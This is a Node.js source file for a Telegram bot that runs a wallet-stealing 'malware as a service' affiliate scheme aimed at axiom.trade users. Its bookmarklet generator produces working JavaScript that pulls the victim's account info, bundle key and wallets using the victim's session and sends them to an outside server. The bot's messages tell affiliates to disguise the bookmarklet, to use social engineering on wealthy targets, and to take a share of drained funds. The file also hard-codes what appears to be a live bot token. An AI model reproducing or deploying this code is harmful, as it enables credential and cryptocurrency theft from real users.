const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const BOT_TOKEN = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const OWNER_ID = '7680513699';
const BASE_URL = 'https://nodebookmark.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// In-memory storage (use database in production)
const affiliates = new Map();
const bookmarklets = new Map();

// Generate custom bookmarklet
function generateBookmarklet(affiliateId, percentage) {
  const bookmarkletCode = `javascript:(async()=>{
    try{
      if(location.hostname==='nodebookmark.onrender.com'){
        return alert('You are already on the bookmarklet site!')
      }
      if(location.hostname!=='axiom.trade'){
        alert('Please navigate to axiom.trade to use this bookmarklet');
        location.replace('https://axiom.trade/discover')
      } else {
        if(!localStorage.getItem('isAuthed')){
          return alert('Please log in to axiom.trade to use this bookmarklet')
        }
        const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();
        const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();
        const bookmarkData={
          telegramId:'${affiliateId}',
          site:location.href,
          user:user,
          bundle:bundle.bundleKey,
          sBundles:localStorage.getItem('sBundles'),
          eBundles:localStorage.getItem('eBundles'),
          affiliate:'${affiliateId}',
          percentage:${percentage}
        };
        location.replace('${BASE_URL}/data/'+btoa(JSON.stringify(bookmarkData)))
      }
    }catch(e){
      console.error('Error:',e);
      alert('Error occurred')
    }
  })();`.replace(/\s+/g, ' ');
  
  return bookmarkletCode;
}

// Store affiliate data
function registerAffiliate(telegramId, percentage, walletAddress) {
  const affiliateData = {
    id: telegramId,
    percentage: percentage,
    wallet: walletAddress,
    bookmarklets: 0,
    totalEarned: 0,
    createdAt: new Date(),
    isActive: true
  };
  
  affiliates.set(telegramId, affiliateData);
  return affiliateData;
}

// Bot commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const welcomeMsg = `
🎯 **Welcome to CryptoSteal MaaS Bot!**

💰 **Earn money by distributing wallet-stealing bookmarklets!**

**Available Commands:**
/generate <percentage> <wallet> - Generate custom bookmarklet
/stats - View your earnings and statistics  
/help - Show this help message
/payout - Request payout of earnings

**How it works:**
1. Generate a custom bookmarklet with your percentage
2. Share it with targets on axiom.trade
3. Earn commission on every successful wallet drain!

**Supported percentages:** 10%-90%
**Minimum payout:** 0.1 SOL

Start earning crypto today! 💎
  `;
  
  bot.sendMessage(chatId, welcomeMsg, { parse_mode: 'Markdown' });
});

bot.onText(/\/generate (\d+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = chatId.toString();
  const percentage = parseInt(match[1]);
  const walletAddress = match[2].trim();
  
  // Validate percentage
  if (percentage < 10 || percentage > 90) {
    bot.sendMessage(chatId, '❌ **Error:** Percentage must be between 10-90%', {
      parse_mode: 'Markdown'
    });
    return;
  }
  
  // Basic wallet validation (Solana address format)
  if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(walletAddress)) {
    bot.sendMessage(chatId, '❌ **Error:** Invalid Solana wallet address format', {
      parse_mode: 'Markdown'
    });
    return;
  }
  
  // Register affiliate
  const affiliate = registerAffiliate(telegramId, percentage, walletAddress);
  
  // Generate bookmarklet
  const bookmarkletCode = generateBookmarklet(telegramId, percentage);
  const bookmarkletId = crypto.randomUUID();
  
  bookmarklets.set(bookmarkletId, {
    affiliateId: telegramId,
    code: bookmarkletCode,
    createdAt: new Date(),
    uses: 0
  });
  
  // Notify owner of new affiliate
  const ownerNotification = `
🆕 **New Affiliate Registered**

👤 **User ID:** ${telegramId}
💰 **Commission:** ${percentage}%
💳 **Wallet:** ${walletAddress}
⏰ **Time:** ${new Date().toLocaleString()}

Total affiliates: ${affiliates.size}
  `;
  
  bot.sendMessage(OWNER_ID, ownerNotification, { parse_mode: 'Markdown' });
  
  const responseMsg = `
🎯 **Custom Bookmarklet Generated!**

💰 **Your Commission:** ${percentage}%
📱 **Your ID:** ${telegramId}
💳 **Payout Wallet:** ${walletAddress}

**📋 Bookmarklet Code:**
\`\`\`
${bookmarkletCode}
\`\`\`

**📖 Instructions:**
1. Copy the entire code above
2. Create a new bookmark in your browser
3. Set the bookmark name to something like "Axiom Tools"  
4. Paste the code as the bookmark URL
5. Share with targets who use axiom.trade
6. Earn ${percentage}% of all drained funds!

💡 **Tips:**
- Target users with large wallet balances
- Use social engineering to build trust
- Higher percentages = more profit but harder to recruit

**Server:** ${BASE_URL}
**⚠️ Legal Notice:** This is for educational/testing purposes only.
  `;
  
  bot.sendMessage(chatId, responseMsg, { 
    parse_mode: 'Markdown',
    disable_web_page_preview: true 
  });
});

bot.onText(/\/stats/, (msg) => {
  const chatId = msg.chat.id;
  const telegramId = chatId.toString();
  const affiliate = affiliates.get(telegramId);
  
  if (!affiliate) {
    bot.sendMessage(chatId, '❌ **Error:** You need to generate a bookmarklet first! Use /generate', {
      parse_mode: 'Markdown'
    });
    return;
  }
  
  // Get bookmarklet stats
  const userBookmarklets = Array.from(bookmarklets.values())
    .filter(b => b.affiliateId === telegramId);
  
  const totalUses = userBookmarklets.reduce((sum, b) => sum + b.uses, 0);
  
  const statsMsg = `
📊 **Your Statistics**

💰 **Total Earned:** ${affiliate.totalEarned.toFixed(4)} SOL
🎯 **Commission Rate:** ${affiliate.percentage}%
📈 **Total Hits:** ${totalUses}
🔗 **Active Bookmarklets:** ${userBookmarklets.length}
📅 **Member Since:** ${affiliate.createdAt.toLocaleDateString()}

💳 **Payout Wallet:** ${affiliate.wallet}
📊 **Status:** ${affiliate.isActive ? '✅ Active' : '❌ Inactive'}

${affiliate.totalEarned >= 0.1 ? '💸 **Ready for payout!** Use /payout' : '⏳ Minimum payout: 0.1 SOL'}
  `;
  
  bot.sendMessage(chatId, statsMsg, { parse_mode: 'Markdown' });
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  const helpMsg = `
🆘 **Help & Commands**

**🎯 Main Commands:**
/generate <percentage> <wallet> - Create bookmarklet
/stats - View earnings and statistics
/payout - Request earnings payout
/help - Show this help

**📋 Example Usage:**
\`/generate 75 HN7cABqLq46Es1jh92dQQisAq662SmxELLLsHHe4YWrH\`

**💰 How Earnings Work:**
- You earn a percentage of all funds drained via your bookmarklets
- Minimum payout: 0.1 SOL
- Payments sent within 24 hours
- Higher percentages = more profit per successful hit

**⚠️ Important:**
- Keep your wallet address secure
- Only share bookmarklets with trusted sources
- This service is for educational purposes only

**🌐 Server:** ${BASE_URL}
Need support? Contact the owner.
  `;
  
  bot.sendMessage(chatId, helpMsg, { parse_mode: 'Markdown' });
});

bot.onText(/\/payout/, (msg) => {
  const chatId = msg.chat.id;
  const telegramId = chatId.toString();
  const affiliate = affiliates.get(telegramId);
  
  if (!affiliate) {
    bot.sendMessage(chatId, '❌ **Error:** No affiliate account found. Use /generate first.', {
      parse_mode: 'Markdown'
    });
    return;
  }
  
  if (affiliate.totalEarned < 0.1) {
    bot.sendMessage(chatId, `❌ **Insufficient Balance**\n\nCurrent: ${affiliate.totalEarned.toFixed(4)} SOL\nMinimum: 0.1 SOL\n\nKeep sharing your bookmarklets! 💪`, {
      parse_mode: 'Markdown'
    });
    return;
  }
  
  // Notify owner of payout request
  const payoutRequest = `
💸 **Payout Request**

👤 **User:** ${telegramId}
💰 **Amount:** ${affiliate.totalEarned.toFixed(4)} SOL
💳 **Wallet:** ${affiliate.wallet}
⏰ **Time:** ${new Date().toLocaleString()}

Please process this payout.
  `;
  
  bot.sendMessage(OWNER_ID, payoutRequest, { parse_mode: 'Markdown' });
  
  const payoutMsg = `
💸 **Payout Requested!**

**Amount:** ${affiliate.totalEarned.toFixed(4)} SOL
**Wallet:** ${affiliate.wallet}
**Status:** Processing...

Your payout will be sent within 24 hours.
Transaction hash will be sent here once confirmed.

Thank you for being a valuable partner! 🤝
  `;
  
  // Reset earnings (in production, mark as pending)
  affiliate.totalEarned = 0;
  affiliates.set(telegramId, affiliate);
  
  bot.sendMessage(chatId, payoutMsg, { parse_mode: 'Markdown' });
});

// Owner-only commands
bot.onText(/\/admin/, (msg) => {
  const chatId = msg.chat.id;
  
  if (chatId.toString() !== OWNER_ID) {
    bot.sendMessage(chatId, '❌ Access denied.');
    return;
  }
  
  const totalAffiliates = affiliates.size;
  const totalBookmarklets = bookmarklets.size;
  const totalEarnings = Array.from(affiliates.values()).reduce((sum, a) => sum + a.totalEarned, 0);
  
  const adminMsg = `
👑 **Admin Dashboard**

📊 **System Stats:**
- Total Affiliates: ${totalAffiliates}
- Total Bookmarklets: ${totalBookmarklets}
- Pending Payouts: ${totalEarnings.toFixed(4)} SOL

**🌐 Server:** ${BASE_URL}
**📱 Bot Status:** ✅ Online

Use /affiliates to see all affiliates.
  `;
  
  bot.sendMessage(chatId, adminMsg, { parse_mode: 'Markdown' });
});

// Error handling
bot.on('polling_error', (error) => {
  console.error('Polling error:', error.code, error.message);
});

bot.on('error', (error) => {
  console.error('Bot error:', error);
});

console.log('🤖 MaaS Telegram Bot started successfully!');
console.log(`📱 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
console.log(`🌐 Backend URL: ${BASE_URL}`);
console.log(`👑 Owner ID: ${OWNER_ID}`);

module.exports = { bot, affiliates, bookmarklets, generateBookmarklet };
